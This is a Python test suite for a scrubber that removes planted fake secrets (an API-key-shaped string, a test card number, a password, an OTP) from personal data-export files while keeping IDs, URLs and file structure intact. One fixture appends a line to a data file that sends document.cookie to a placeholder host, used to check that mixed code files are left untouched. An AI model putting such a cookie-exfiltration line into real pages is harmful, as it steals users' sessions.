"""Raw export files scrubbed in place: only text is touched, every file still reads, a dry run changes nothing.
Every secret here is made up at run time."""
import csv, io, json, os, shutil, tempfile, unittest
from unittest import mock
from tests import fixture  # noqa: F401
from ctx import rawscrub

KEY = "sk" + "-proj-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6"           # an openai-shaped key, built from parts
CARD = "4111 1111 " + "1111 1111"
ID = "DAABCgABMadeUpXx__8kKAAIMadeUpYyZAQgAAwAAAAIAA"                 # a cursor in the shape x uses: must survive
URL = "https://example.com/p/1795252310737/Zx9Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk0Lz"


class Raw(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="ctx-raw-")
        self.addCleanup(shutil.rmtree, self.root, True)
        self.x = os.path.join(self.root, "x-2026-01-01", "data")
        os.makedirs(self.x)
        self.files = {}
        self.put("x-2026-01-01/data/dms.js", "window.YTD.dm.part0 = " + json.dumps([{"id": ID, "url": URL, "text": "use this key " + KEY + " for now", "n": 3}]))
        self.put("x-2026-01-01/data/clean.js", "window.YTD.like.part0 = [ {\"id\" : \"" + ID + "\"} ]")
        self.put("chatgpt-1/conversations.json", json.dumps({"mapping": {ID: {"parts": ["my card is " + CARD + " ok", KEY]}}}))
        self.put("telegram-1/result.jsonl", json.dumps({"id": 1, "text": "otp is 483920 for login"}) + "\nnot json at all " + KEY + "\n")
        self.put("linkedin-1/messages.csv", "id,from,content\n7,ada,\"the password is Tr0ub4dor&3, keep it\"\n8,ada,\"a line, with a comma\"\n")
        self.put("google-1/activity.html", "<html><body><div class=\"c\" data-id=\"" + ID + "\">searched for " + KEY + "</div><a href=\"" + URL + "\">a link</a></body></html>")
        self.put("google-1/mail.mbox", "From a@b\n\nbody " + KEY + "\n")
        self.put("instagram-1/photo.jpg", "\xff\xd8 not text " + KEY, binary=True)
        self.put("bookmarks.at", ID)
        self.put("x-2026-01-01/assets/js/viewer.js", "(function(){var k=\"" + KEY + "\";window.YTD={};})();")        # the archive's own viewer: a program
        self.put("x-2026-01-01/data/manifest.js", "window.__THAR_CONFIG = " + json.dumps({"userInfo": {"note": "key " + KEY + " here"}, "dataTypes": {"n": 1}}))
        self.put("x-2026-01-01/data/odd.js", "window.YTD.x.part0 = [ {\"text\" : \"token " + KEY + " ok\"} ]\n")
        self.put("x-2026-01-01/data/sneaky.js", "window.YTD.x.part0 = [1]; fetch('https://example.com/' + document.cookie)")

    def put(self, rel, text, binary=False):
        p = os.path.join(self.root, *rel.split("/"))
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb") as f:
            f.write(text.encode("latin-1") if binary else text.encode("utf-8"))
        self.files[rel] = p
        return p

    def read(self, rel):
        with open(self.files[rel], "rb") as f:
            return f.read()

    def test_a_dry_run_counts_and_changes_nothing(self):
        before = {r: self.read(r) for r in self.files}
        out = rawscrub.run(self.root)
        self.assertEqual({r: self.read(r) for r in self.files}, before)
        self.assertEqual(out["files"], 13)
        self.assertEqual(sum(v.get("would change", 0) for v in out["by_kind"].values()), 7)
        self.assertGreaterEqual(out["rules"]["named_key"], 3)
        self.assertIn("card", out["rules"])
        self.assertEqual(out["by_export"]["x"], {"would change": 3, "clean": 1, "left": 2})
        text = json.dumps(out)
        for secret in (KEY, CARD, ID, "ada", "Tr0ub4dor", "conversations", "dms"):       # counts and kinds only: no text, no name, no file name
            self.assertNotIn(secret, text)
        self.assertEqual(out["left"], {"not a text file": {".mbox": 1, ".jpg": 1}, "a place in a list, no text": {".at": 1}, "a program, not data": {".js": 1}, "does not parse as js": {".js": 1}})

    def test_applied_the_secrets_go_and_every_file_still_reads(self):
        untouched = {r: self.read(r) for r in ("x-2026-01-01/data/clean.js", "google-1/mail.mbox", "instagram-1/photo.jpg", "bookmarks.at")}
        out = rawscrub.run(self.root, apply=True)
        self.assertTrue(out["applied"])
        for rel in ("x-2026-01-01/data/dms.js", "chatgpt-1/conversations.json", "telegram-1/result.jsonl", "linkedin-1/messages.csv", "google-1/activity.html"):
            text = self.read(rel).decode()
            for secret in (KEY, CARD.replace(" ", ""), CARD, "483920", "Tr0ub4dor"):
                self.assertNotIn(secret, text, rel)
        dms = self.read("x-2026-01-01/data/dms.js").decode()
        self.assertTrue(dms.startswith("window.YTD.dm.part0 = "))
        row = json.loads(dms.split("=", 1)[1])[0]
        self.assertEqual((row["id"], row["url"], row["n"]), (ID, URL, 3))                       # ids, links and numbers are as they were
        self.assertIn("use this key", row["text"])
        self.assertEqual(list(json.loads(self.read("chatgpt-1/conversations.json"))["mapping"]), [ID])
        lines = self.read("telegram-1/result.jsonl").decode().split("\n")
        self.assertEqual(json.loads(lines[0])["id"], 1)
        self.assertIn("not json at all", lines[1])                                              # a line that is not json keeps its words and loses the key
        rows = list(csv.reader(io.StringIO(self.read("linkedin-1/messages.csv").decode())))
        self.assertEqual((rows[0], rows[2]), (["id", "from", "content"], ["8", "ada", "a line, with a comma"]))
        page = self.read("google-1/activity.html").decode()
        self.assertIn('data-id="%s"' % ID, page)
        self.assertIn('href="%s"' % URL, page)
        for rel in ("x-2026-01-01/data/manifest.js", "x-2026-01-01/data/odd.js"):
            self.assertNotIn(KEY, self.read(rel).decode(), rel)
        self.assertTrue(self.read("x-2026-01-01/data/manifest.js").decode().startswith("window.__THAR_CONFIG = {"))
        self.assertEqual(json.loads(self.read("x-2026-01-01/data/manifest.js").decode().split("=", 1)[1])["dataTypes"], {"n": 1})
        self.assertTrue(self.read("x-2026-01-01/data/odd.js").decode().startswith("window.YTD.x.part0 = ["))
        untouched.update({r: None for r in ("x-2026-01-01/assets/js/viewer.js", "x-2026-01-01/data/sneaky.js")})    # a program, and data with code after it: neither is rewritten
        for rel, was in untouched.items():
            if was is None:
                self.assertIn(KEY if "viewer" in rel else "document.cookie", self.read(rel).decode(), rel)
                continue
            self.assertEqual(self.read(rel), was, rel)
        self.assertEqual([n for _, _, fs in os.walk(self.root) for n in fs if n.endswith(".scrubbing")], [])
        again = rawscrub.run(self.root, apply=True)                                             # a second pass finds nothing to do
        self.assertEqual(sum(v.get("changed", 0) for v in again["by_kind"].values()), 0)

    def test_a_crash_while_writing_leaves_the_old_file_whole(self):
        p = self.files["chatgpt-1/conversations.json"]
        was = self.read("chatgpt-1/conversations.json")
        with mock.patch("os.replace", side_effect=OSError("stopped here")):
            self.assertEqual(rawscrub.one(p, apply=True), "left: could not be written")
        self.assertEqual(self.read("chatgpt-1/conversations.json"), was)
        self.assertFalse(os.path.exists(p + ".scrubbing"))

    def test_a_file_that_would_not_parse_afterwards_is_left(self):
        p = self.files["chatgpt-1/conversations.json"]
        was = self.read("chatgpt-1/conversations.json")
        with mock.patch.object(rawscrub, "_still_reads", lambda kind, new: False):
            self.assertEqual(rawscrub.one(p, apply=True), "left: the scrubbed text would not parse")
        self.assertEqual(self.read("chatgpt-1/conversations.json"), was)
        broken = self.put("chatgpt-1/broken.json", '{"text": "' + KEY)
        self.assertEqual(rawscrub.one(broken, apply=True), "left: does not parse as json")

    def test_the_time_on_a_file_is_kept_and_a_link_is_never_followed(self):
        p = self.files["x-2026-01-01/data/dms.js"]
        os.utime(p, (1700000000, 1700000000))
        rawscrub.one(p, apply=True)
        self.assertEqual(int(os.stat(p).st_mtime), 1700000000)
        self.assertEqual(os.stat(p).st_mode & 0o777, 0o600)
        outside = tempfile.NamedTemporaryFile(suffix=".json", delete=False)
        outside.write(json.dumps({"text": "key " + KEY + " here"}).encode())
        outside.close()
        os.symlink(outside.name, os.path.join(self.root, "link.json"))
        self.assertEqual(rawscrub.one(os.path.join(self.root, "link.json"), apply=True), "left: not a plain file")
        with open(outside.name) as f:
            self.assertIn(KEY, f.read())
        os.remove(outside.name)

    def test_applying_asks_first(self):
        with mock.patch("sys.stdin.isatty", lambda: False), self.assertRaises(SystemExit):
            rawscrub.main(["--apply"])


if __name__ == "__main__":
    unittest.main()
